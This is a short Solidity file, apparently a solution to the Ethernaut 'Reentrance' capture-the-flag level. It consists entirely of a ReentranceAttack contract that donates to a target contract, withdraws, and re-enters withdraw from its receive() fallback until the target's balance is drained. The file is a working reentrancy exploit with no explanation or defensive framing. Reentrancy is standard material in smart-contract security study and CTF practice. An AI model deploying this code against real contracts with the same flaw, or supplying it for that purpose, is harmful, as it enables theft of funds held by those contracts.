// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

import {Test, console} from "forge-std/Test.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public target;
    uint256 public deposit;

    constructor(address targetAddress) payable {
        target = IReentrance(targetAddress);
    }

    function attack() external payable {
        deposit = msg.value;
        target.donate{value: deposit}(address(this));
        target.withdraw(deposit);
    }

    receive() external payable {
        uint256 remainingBalance = address(target).balance;
        if (remainingBalance > 0) {
            if (deposit < remainingBalance) {
                target.withdraw(deposit);
            } else {
                target.withdraw(remainingBalance);
            }
        }
    }
}
